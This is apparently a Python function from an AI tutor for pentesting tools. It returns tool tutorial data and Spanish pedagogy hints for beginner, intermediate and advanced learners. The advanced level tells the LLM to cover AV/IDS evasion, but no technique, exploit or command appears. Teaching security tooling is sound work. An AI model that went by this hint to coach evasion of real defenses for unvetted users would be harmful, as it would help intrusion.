            "available": sorted(_TUTORIALS.keys()),
            "suggestion": (
                "Si la herramienta tiene un cheatsheet en get_cheatsheet() o "
                "get_cheatsheet_extended(), úsalo como referencia rápida mientras "
                "construimos el tutorial de la herramienta."
            ),
        }

    data = _TUTORIALS[matched]

    # Indicaciones pedagógicas según nivel — las usa el LLM para adaptar
    pedagogy = {
        "principiante": {
            "enfoque": "Explicar cada concepto desde cero antes de mostrar el comando. Usar analogías. No asumir conocimiento previo de redes o protocolos.",
            "velocidad": "Lenta. Un paso a la vez, confirmar comprensión antes de avanzar.",
            "preguntas": "Hacer preguntas sencillas de comprensión, no de análisis profundo.",
            "comandos": "Mostrar el comando más simple primero. Añadir flags gradualmente.",
        },
        "intermedio": {
            "enfoque": "Explicar el razonamiento detrás de cada paso. Dar contexto de cuándo usar cada variante. Hacer preguntas que requieran conectar puntos.",
            "velocidad": "Normal. Explicar conceptos nuevos, asumir fundamentos de redes.",
            "preguntas": "Preguntas que conecten la herramienta con el flujo de pentesting.",
            "comandos": "Mostrar el comando estándar de uso real, con las flags más útiles.",
        },
        "avanzado": {
            "enfoque": "Centrarse en casos edge, optimización, evasión de AV/IDS, integración con otras herramientas. Discutir qué hace la herramienta internamente.",
            "velocidad": "Rápida. El estudiante conoce los fundamentos, ir directo a los matices.",
            "preguntas": "Preguntas sobre casos límite, alternativas y trade-offs.",
            "comandos": "Variantes avanzadas, flags de optimización, combinaciones con otras herramientas.",
        },
    }

    level_key = level.lower().strip()
    if level_key not in pedagogy:
        level_key = "intermedio"

    return {
        "status": "success",
        "tool_name": data["nombre"],
        "category": data["categoria"],
        "level": level_key,
        "what_it_is": data["que_es"],
        "why_it_matters": data["por_que_importa"],
        "installation": data.get("instalacion", "Ver documentación oficial."),
        "key_concepts": data.get("conceptos_clave", []),
        "learning_path": data.get("flujo_aprendizaje", []),
        "common_mistakes": data.get("errores_comunes", []),
        "essential_flags": data.get("flags_esenciales", {}),
        "resources": data.get("recursos", []),
        "next_natural_step": data.get("siguiente_paso_natural", ""),
        "pedagogy_hints": pedagogy[level_key],
        "total_steps": len(data.get("flujo_aprendizaje", [])),
    }
